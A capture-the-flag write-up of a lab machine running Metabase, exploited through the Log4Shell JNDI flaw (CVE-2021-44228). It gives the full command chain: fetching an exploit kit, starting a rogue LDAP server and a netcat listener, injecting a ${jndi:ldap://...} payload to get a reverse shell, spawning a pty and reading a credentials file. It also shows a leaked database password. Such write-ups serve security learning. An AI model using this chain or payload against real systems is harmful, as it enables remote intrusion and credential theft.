## Synopsis
Remote Code Execution vulnerability in apache Log4j2 ≤= 2.14.1

Allows attackers to execute arbitrary system command by loading code from an attacker-controlled LDAP server via the Java Naming Directory Interface JNDI reported by [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)

## TL:DR
find **user** and **root flag** trough remote code execution. Therefore use this  [exploit](https://github.com/pimps/JNDI-Exploit-Kit/) and setup `netcat`.  
## getting started
We add the `domain` and `ip` to `/etc/hosts` .
```
echo "10.10.69.123 metabase.htb" | sudo tee -a /etc/hosts
```
## enumeration
As we start with a `nmap` scan it revails a `nginx server` is listening on default port 80 and we are redireted to `metabase.htb` .


We look for something interesting in source code with `curl`
```sh
curl -v metabase.htb
```


## Expliotation
We found the information here for `JNDI injections` vulnerabilities. Public expliots are available. We look for  a suitable [exploit](https://github.com/pimps/JNDI-Exploit-Kit/) and download the available compiled version to our attacking machine:
```sh
wget https://github.com/pimps/JNDI-Exploit-Kit/raw/master/target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar
```

Now we run the exploit by specifiying the LDAP server adress `IP:port` with the `-L` option and the adress of our listener with the `-S` option:

```sh
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 10.10.14.7:1389 -S 10.10.14.22:4444
```

## Privilege Escalation
Getting prepared for privilege escalation we have to setup `netcat` to listen on port `4444`.
```sh
nc -lvnp 4444
```

We pick the LDAP payload targeting with `trustURLCodebase=true` and type the following string to the Native query Matabase page

NOTE: While suggesting otherwise the option `JDK 1.8`  was not working for me.

We add new query in sample data
```sh
${jndi:ldap://10.10.14.7:1389/57sbhf}
```
![db query](img/db_query.png)

We see in our terminal a succesfull privilege escalation en try to upgrade our shell to a fully interactive pty. Due to the fact `python3` is installed on the host, we run:
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

in the metabase group we can search for files:
```sh
find / -group metabase -ls 2>/dev/null | grep -v /proc

```
A password is found in `/etc/default/metabase`:
```sh
cat /etc/default/metabase
MB_DB_PASS=fHj3sxZ0.f
```

The rootflag is found in `root/root.txt`
